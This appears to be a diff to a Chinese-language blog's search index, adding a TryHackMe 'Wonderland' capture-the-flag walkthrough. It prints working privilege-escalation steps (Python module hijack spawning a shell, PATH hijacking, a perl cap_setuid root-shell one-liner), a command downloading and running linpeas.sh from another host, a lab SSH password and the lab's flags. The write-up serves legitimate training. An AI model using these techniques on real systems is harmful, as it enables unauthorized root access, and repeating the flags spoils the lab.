@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>Tryhackme练习-Wonderland</title>
+      <link href="/post/a6d3cf2f.html"/>
+      <url>/post/a6d3cf2f.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>由于tryhackme是在线靶场，所以这里的IP均为对方的内网IP</p><p>攻击机器：10.10.242.186</p><p>靶机：10.10.173.3</p><p>目标：获取2个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先我们使用fscan进行端口扫描，<code>fscan -h 10.10.173.3</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115154149228.png" alt="image-20241115154149228"></p><p>这里开放了80端口，我们直接访问80端口即可，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115154520201.png" alt="image-20241115154520201"></p><p>首先我们使用gobuster扫一下后门路径，使用如下命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster -u http://10.10.173.3:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115155115952.png" alt="image-20241115155115952"></p><p>我们访问<code>r</code>路径，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115155203115.png" alt="image-20241115155203115"></p><p>叫我们继续往前，keepgoing，说明我们的大体方向是对的，现在我们还需要去看看其他地方有没有信息，我们的首页还给我们提供了一张图片，我们可以去看看这张图片是否存在图片隐写的问题</p><h2 id="steghide探寻隐藏信息"><a href="#steghide探寻隐藏信息" class="headerlink" title="steghide探寻隐藏信息"></a>steghide探寻隐藏信息</h2><p>我们将这张图片下载下来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.173.3/img/white_rabbit_1.jpg</span><br></pre></td></tr></table></figure><p>我们使用steghide进行隐藏信息提取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steghide extract -sf white_rabbit_1.jpg </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115155626403.png" alt="image-20241115155626403"></p><p>我们发现有一个<code>hint.txt</code>，我们直接查看一下这个txt文件即可，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115155718253.png" alt="image-20241115155718253"></p><p>这里叫我们<code>follow r a b b i t</code>，根据我们前期探测出来的r路径，我们可以猜测其路径结构是<code>/r/a/b/b/i/t</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115155902485.png" alt="image-20241115155902485"></p><p>我们查看页面源码，可以发现我们这里泄露了某个账户的ssh账号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alice:HowDothTheLittleCrocodileImproveHisShiningTail</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115155958257.png" alt="image-20241115155958257"></p><p>我们这里使用ssh登录即可</p><h2 id="权限横移"><a href="#权限横移" class="headerlink" title="权限横移"></a>权限横移</h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115160203180.png" alt="image-20241115160203180"></p><p>我们这里成功以alice账户登录了ssh，这里我们列举一下目录，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115160255758.png" alt="image-20241115160255758"></p><p>alice目录下有一个root.txt，那我们不妨猜测user.txt在<code>/root</code>下，我们尝试切换目录，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115160750155.png" alt="image-20241115160750155"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thm&#123;&quot;Curiouser and curiouser!&quot;&#125;</span><br></pre></td></tr></table></figure><p>我们成功在root目录下找到了我们的<code>user.txt</code>，但是我们也发现我们根本没办法进入到其他用户的目录下，所以我们这里要进行权限横移</p><p>我们发现在alice目录下存在一个<code>walrus_and_the_carpenter.py</code>文件，且我们执行<code>sudo -l</code>，可以发现我们可以切换到<code>rabbit</code>用户下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115162131917.png" alt="image-20241115162131917"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115161230187.png" alt="image-20241115161230187"></p><p>而且这个文件我们可以编辑，所以我们先看看这个文件干了什么</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115161543992.png" alt="image-20241115161543992"></p><p>我们发现首先<code>import random</code>这里我们可以伪造一个<code>random.py</code>文件，我们在当前目录下创建一个<code>random.py</code>文件，内容写上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115162252842.png" alt="image-20241115162252842"></p><p>我们再运行这个py文件即可，如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</span><br></pre></td></tr></table></figure><p>我们成功切换到rabbit用户下，我们再看看有没有什么我们可以利用的信息，我们首先查看到rabbit下存放在一个二进制文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115163458959.png" alt="image-20241115163458959"></p><p>我们尝试去读取里面的函数，但是我们发现没有<code>strings</code>函数，我们先尝试八这个文件下载下来，我们开启web服务，如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115163834027.png" alt="image-20241115163834027"></p><p>我们使用<code>wget http://10.10.173.3:8080/teaParty</code>下载到本地，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115212213880.png" alt="image-20241115212213880"></p><p>我们利用<code>strings</code>函数查看该二进制文件，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115213420324.png" alt="image-20241115213420324"></p><p>我们可以看见里面有个<code>date</code>函数，我们可以尝试利用环境变量进行攻击，以达到权限横移，如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">touch date</span><br><span class="line">nano date #写入/bin/bash</span><br><span class="line">chmod +x date</span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure><p>之后我们运行<code>teaParty</code>文件即可，这样我们就能获取到<code>hatter</code>用户的权限，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115214543542.png" alt="image-20241115214543542"></p><p>我们直接看该目录下的文件，我们可以看到目录下面有个password.txt，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115214731201.png" alt="image-20241115214731201"></p><p>我们直接登录这个用户然后进行权限提升</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>我们首先尝试sudo提权，但是没有任何可以利用的信息，我们接着尝试suid提权，但是也没有什么发现，这里我们先下载<code>linpeas.sh</code>来看看版本是否有漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.14.91.183/linpeas.sh</span><br><span class="line">chmod +x linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure><p>我们主要看标红的信息即可，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115220708973.png" alt="image-20241115220708973"></p><p>我们发现这里有一串被特别标记的，大概率就是我们可以利用的利用点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/perl = cap_setuid+ep 这行代码的意思是：</span><br><span class="line">给 /usr/bin/perl 文件设置能力，使得它具有 cap_setuid 能力，并且这个能力是有效的 (+e) 和被允许的 (+p)。</span><br><span class="line">这意味着 Perl 解释器在执行时将有能力调用 setuid() 函数，进而可以更改进程的 UID。</span><br></pre></td></tr></table></figure><p>所以我们可以尝试使用perl进行uid的赋值，进而获取root的uid，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115221122273.png" alt="image-20241115221122273"></p><p>我们直接执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./perl -e &#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115221234867.png" alt="image-20241115221234867"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241115221322947.png" alt="image-20241115221322947"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thm&#123;Twinkle, twinkle, little bat! How I wonder what you\u2019re at!&#125;</span><br></pre></td></tr></table></figure><p>本题到此结束</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络攻防 </category>
+          
+          <category> 红蓝对抗 </category>
+          
+          <category> 红队入侵 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 实战打靶 </tag>
+            
+            <tag> 红队技战法 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>红日靶场-1</title>
       <link href="/post/8011e4fc.html"/>
       <url>/post/8011e4fc.html</url>
@@ -1925,11 +1956,11 @@
       
         <tags>
             
-            <tag> 端口扫描 </tag>
-            
             <tag> CDN </tag>
             
             <tag> WAF </tag>
+            
+            <tag> 端口扫描 </tag>
             
             <tag> 负载均衡 </tag>
             
@@ -2057,15 +2088,15 @@
       
         <tags>
             
-            <tag> CDN </tag>
-            
-            <tag> WAF </tag>
-            
             <tag> Web安全 </tag>
             
             <tag> 资产架构 </tag>
             
             <tag> 端口 </tag>
+            
+            <tag> CDN </tag>
+            
+            <tag> WAF </tag>
             
             <tag> 源码泄露 </tag>
             
